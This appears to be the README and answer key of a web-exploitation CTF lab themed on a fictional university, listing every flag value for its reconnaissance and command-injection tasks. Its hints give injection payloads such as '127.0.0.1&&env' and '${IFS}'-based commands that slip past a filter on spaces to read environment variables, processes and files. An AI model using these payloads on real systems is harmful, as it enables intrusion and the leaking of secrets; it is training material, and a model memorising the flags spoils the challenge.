# Los Pollos Hermanos University (LPHU) — CTF Lab

A two-tier realistic web exploitation and privilege vector challenge designed for TryHackMe / Bugathon competitions.

---

## Challenge Matrix & Artifact Breakdown

### Task 1: Level 0 — Network Reconnaissance & OSINT (7 Flags)

| # | Objective / Prompt | Flag Value | Discovery Method / Hint |
|---|---|---|---|
| **0.1** | Query the staging DNS TXT record for the host domain. | `FLAG{bluething_0.1}` | Run `dig @<TARGET_IP> TXT staging.lphu.internal` |
| **0.2** | Inspect the SSH banner during connection handshake. | `FLAG{bluething_0.2}` | Connect using `nc -vn <TARGET_IP> 22` or `ssh -v` |
| **0.3** | Read the web crawler directives file. | `FLAG{bluething_0.3}` | Inspect `http://<TARGET_IP>/robots.txt` |
| **0.4** | Identify the disallowed internal directory entry. | `FLAG{bluething_0.4}` | Review the `Disallow:` line in `robots.txt` |
| **0.5** | Recover the audit note inside the backup directory. | `FLAG{bluething_0.5}` | Inspect `http://<TARGET_IP>/admin_backup/note.txt` |
| **0.6** | Extract the client session token from local storage. | `FLAG{bluething_0.6}` | Inspect DevTools -> Application -> Local Storage |
| **0.7** | **[Level 0 Milestone]** Trigger the course report export. | `FLAG{blue_stuff}` | Click 'Download Report' on the student dashboard |

---

### Task 2: Level 1 — WAF Bypass & Remote Foothold (7 Flags)

| # | Objective / Prompt | Flag Value | Discovery Method / Hint |
|---|---|---|---|
| **1.1** | Uncover the internal diagnostic node route. | `FLAG{bluething_1.1}` | Inspect DevTools -> Console logs on dashboard |
| **1.2** | Trigger the defensive WAF signature alert. | `FLAG{bluething_1.2}` | Inject forbidden tokens (space, `;`, or `cat`) |
| **1.3** | Exfiltrate shell environment variables without spaces. | `FLAG{bluething_1.3}` | Execute `127.0.0.1&&env` or `127.0.0.1&&printenv` |
| **1.4** | Read the OS release version file. | `FLAG{bluething_1.4}` | Execute `127.0.0.1&&tac${IFS}/etc/issue` |
| **1.5** | Snoop running processes for sensitive command arguments. | `FLAG{bluething_1.5}` | Execute `127.0.0.1&&ps${IFS}aux` |
| **1.6** | Discover the hidden system core directory. | `FLAG{bluething_1.6}` | Execute `127.0.0.1&&ls${IFS}-la` |
| **1.7** | **[Level 1 Milestone]** Read the core root flag. | `FLAG{Fill_your_pockets_or_die}` | Execute `127.0.0.1&&tac${IFS}.secret_core/flag1.txt` |

---
